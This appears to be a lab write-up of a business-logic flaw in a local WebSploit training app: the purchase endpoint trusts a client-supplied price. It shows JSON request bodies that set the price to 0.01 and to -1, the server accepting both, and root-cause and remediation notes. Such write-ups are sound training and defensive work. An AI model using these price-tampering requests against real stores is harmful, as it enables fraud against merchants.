# Price Manipulation — WebSploit `hydra-nexus`

## Target

http://127.0.0.1:5010

## Endpoint

POST /api/purchase

## Vulnerability

Business Logic — Client-Supplied Price Manipulation

## Baseline

A normal purchase request used:

```json
{
  "product_id": "1",
  "quantity": 1,
  "price": 999.99
}
```

The application calculated:

```text
total_amount = 999.99
```

## Proof of Concept

The same product was submitted with a manipulated price:

```json
{
  "product_id": "1",
  "quantity": 1,
  "price": 0.01
}
```

The server accepted the request and returned:

```text
unit_price: 0.01
total_amount: 0.01
```

A negative price was also accepted:

```json
{
  "product_id": "1",
  "quantity": 1,
  "price": -1
}
```

The server returned:

```text
unit_price: -1
total_amount: -1
```

## Impact

An attacker can manipulate the transaction price because the application
does not enforce the authoritative price for the selected product.

Depending on the surrounding payment and order-processing logic, this could
allow purchases at unauthorized prices or create negative transaction
values.

## Root Cause

The server trusts the `price` parameter supplied by the client and calculates
the order total directly from that value.

## Remediation

* Retrieve product prices from the server-side database.
* Never trust client-supplied monetary values.
* Recalculate totals server-side.
* Reject zero and negative prices where they are not valid.
* Validate quantity and product identifiers server-side.
* Use appropriate monetary representations and transaction controls.

## Scope

127.0.0.1:5010 — local WebSploit training environment.
